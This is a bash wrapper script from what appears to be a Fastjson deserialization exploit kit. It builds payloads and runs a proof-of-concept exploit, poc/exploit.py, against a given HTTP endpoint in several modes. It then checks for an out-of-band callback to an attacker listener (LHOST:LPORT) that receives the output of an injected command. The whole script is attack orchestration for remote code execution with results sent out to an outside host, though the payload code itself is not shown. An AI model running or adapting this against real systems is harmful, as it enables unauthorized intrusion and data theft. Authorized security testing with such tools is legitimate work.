#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

usage() {
    cat <<'USAGE'
Usage:
  scripts/http-test.sh <LHOST> <LPORT> <TARGET_URL> [ENDPOINT]

Purpose:
  Test an existing HTTP/HTTPS Fastjson endpoint with multiple payload modes.

Examples:
  scripts/http-test.sh 192.168.65.254 19090 http://127.0.0.1:18080 /parse
  CMD=id-oob MODES="jdk8-http fd" WAIT=20 MAX_FD=256 scripts/http-test.sh 172.20.10.2 19090 http://10.0.0.8:8080 /api/json

Environment:
  CMD             Command embedded in the payload. Default: id-oob
  MODES           Payload modes to try. Default: jdk8-http fd
  WAIT            Seconds to wait for /out per mode. Default: 15
  MAX_FD          Max fd for fd mode. Default: 256
  TAG             Optional class-name tag. Default: generated per run
  STOP_ON_SUCCESS Stop after the first OOB hit. Default: 1
USAGE
}

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ] || [ "$#" -lt 3 ]; then
    usage
    exit 0
fi

LHOST="$1"
LPORT="$2"
TARGET_URL="$3"
ENDPOINT="${4:-/parse}"
CMD="${CMD:-id-oob}"
MODES="${MODES:-jdk8-http fd}"
WAIT="${WAIT:-15}"
MAX_FD="${MAX_FD:-256}"
STOP_ON_SUCCESS="${STOP_ON_SUCCESS:-1}"
BASE_TAG="${TAG:-t$(date +%s)}"

case "$TARGET_URL" in
    http://*|https://*) ;;
    *)
        echo "[-] TARGET_URL must start with http:// or https://"
        exit 1
        ;;
esac

echo "[*] HTTP target: $TARGET_URL$ENDPOINT"
echo "[*] Callback:    http://$LHOST:$LPORT/"
echo "[*] Modes:       $MODES"
echo "[*] Command:     $CMD"

overall=1
for mode in $MODES; do
    mode_tag="${BASE_TAG}_${mode//-/_}"
    echo
    echo "== HTTP test mode: $mode =="
    bash scripts/build.sh "$LHOST" "$LPORT" "$CMD" "$mode" "$mode_tag" >/tmp/fastjson-http-build.log
    tail -n 4 /tmp/fastjson-http-build.log

    set +e
    python3 -u poc/exploit.py "$LHOST" "$LPORT" "$TARGET_URL" "$ENDPOINT" \
        --mode "$mode" --max-fd "$MAX_FD" --tag "$mode_tag" --once --wait "$WAIT" \
        >"/tmp/fastjson-http-${mode}.log" 2>&1
    status=$?
    set -e

    if [ "$status" = 0 ]; then
        echo "[+] $mode: ID-OOB OK"
        grep -E -A1 -m1 '^\[\+\] OOB POST /out' "/tmp/fastjson-http-${mode}.log" || true
        overall=0
        if [ "$STOP_ON_SUCCESS" = "1" ]; then
            exit 0
        fi
    else
        echo "[-] $mode: ID-OOB FAIL"
        tail -n 35 "/tmp/fastjson-http-${mode}.log"
    fi
done

exit "$overall"
